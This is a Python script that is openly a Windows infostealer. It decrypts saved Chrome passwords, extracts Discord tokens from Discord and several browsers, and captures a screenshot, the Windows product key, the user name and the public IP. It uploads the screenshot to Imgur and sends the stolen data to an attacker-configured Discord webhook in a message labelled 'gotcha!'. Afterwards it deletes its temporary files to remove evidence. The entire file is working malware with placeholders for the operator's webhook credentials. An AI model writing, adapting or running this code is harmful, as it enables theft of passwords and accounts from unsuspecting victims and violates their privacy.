import dhooks, os, re, sys, base64, json, requests, string, random, subprocess, ctypes, shutil, sqlite3, zipfile, subprocess, cryptography, win32crypt
if sys.platform.startswith('linux'):
    exit()
else:
    pass


from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES


from dhooks import Webhook, Embed, File
from base64 import b64decode, b64encode
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from PIL import ImageGrab
from sys import argv
# WEBHOOK HERE :
# BELOW IS AN EXAMPLE OF WHAT YOUR WEBHOOK-ID, AND WEBHOOK-TOKEN IS
#                      V "webhID"   V "webhAT"
# discord/api/webhooks/000000000000/token
webhID = "webhook-id"
webhAT = "webhook-token"

http = "https"
disc = "discord"
webh = "webhooks"
appl = "api"
server = f"{http}://{disc}.com/{appl}/{webh}/{webhID}/{webhAT}"
hook = Webhook(f"{server}")

# IMGUR DESKTOP-IMAGE UPLOAD
def upload():
    try:
        imgur = requests.post(
            r'https://api.imgur.com/3/upload.json', 
            headers = {"Authorization": "Client-ID #CLIENT-ID GOES HERE"},
            data = {
                'key': '# CLIENT SECRET GOES HERE', 
                'image': b64encode(open(r'C:\ProgramData\screenshot.jpg', 'rb').read()),
                'type': 'base64',
                'name': f'{name}.jpg',
                'title': 'victim\'s desktop'})
        image = imgur.json()['data']['link']
        return image
    except:
        pass

# VARIABLES
ip = requests.get("https://api.ipify.org").text
name = ''.join(random.choice(string.ascii_letters) for i in range (20))
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


# PASSWORD-STEALERS
def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chromepassword:
    def __init__(self):
        self.passwordList = []


    def chromedb(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '====================\nHOSTNAME => : %s\nLOGIN => : %s\nVALUE => : %s\n====================\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)


    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass


    def saved(self):
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)


if __name__ == "__main__":
    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()

def master():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        pass
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key


def dpayload(cipher, payload):
    return cipher.decrypt(payload)


def gcipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def dpassword(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = gcipher(master_key, iv)
        decrypted_pass = dpayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        pass


# DISCORD TOKEN EXTRACTION
def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def gotcha():
    # SCREENSHOT VARIABLES :
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass
    
    # .ZIP VARIABLES :
    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        passwords = File(r'C:\ProgramData\passwords.zip')
    except:
        pass

    # WINKEY VARIABLES :
    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except:
        pass


    # DISCORD TOKEN VARIABLES :
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'

    # SEND OUR ASSETS VIA DISCORD WEBHOOK :
    try:
        embed = Embed(title='gotcha!',description='victim\'s information => successfully extracted',color=0x2f3136,timestamp='now')
        embed.add_field("winkey:",f"user => {usr}\ntype => {types}\nkey => {keys}")
        embed.add_field("tokens:",message)
        embed.add_field("IP:",f"{ip}")
        embed.set_image(url=upload())
        hook.send(embed=embed, file=passwords)
    except:
        pass


    # ATTEMPT TO REMOVE EVIDENCE :
    try:
        subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
        subprocess.os.system(r'del C:\ProgramData\passwords.zip')
        subprocess.os.system(r'del C:\ProgramData\passwords.txt')
        subprocess.os.system(r'del Loginvault.db')
    except:
        pass

gotcha()
